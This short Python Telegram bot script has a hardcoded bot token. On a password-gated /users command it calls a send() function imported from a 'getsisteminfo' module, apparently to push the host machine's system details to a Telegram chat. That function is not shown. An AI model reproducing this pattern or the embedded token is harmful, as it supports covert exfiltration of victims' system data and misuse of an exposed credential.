from telebot import TeleBot
from telebot import TeleBot
import pickle
from getsisteminfo import *
bot=TeleBot('1715016002:AAE79lpyz63sm9SvNX4ddRP51j6Qs82AJPk',parse_mode='html')
def extract_arg(arg):
    return arg.split()[1:]
@bot.message_handler(commands=['start'])
def yourCommand(message):
    bot.reply_to(message,"I'm started")

@bot.message_handler(commands=['users'])
def yourCommand(message):
    secret_code = extract_arg(message.text)
    try:
        if secret_code[0] == 'my_code':
            send(message.chat.id)
            bot.reply_to(message,text=f"code True: {secret_code[0]}")
        elif secret_code[0] != 'my_code':
            bot.reply_to(message,text=f"code False")
    except  IndexError:
            bot.reply_to(message,text=f"Index error")
bot.polling()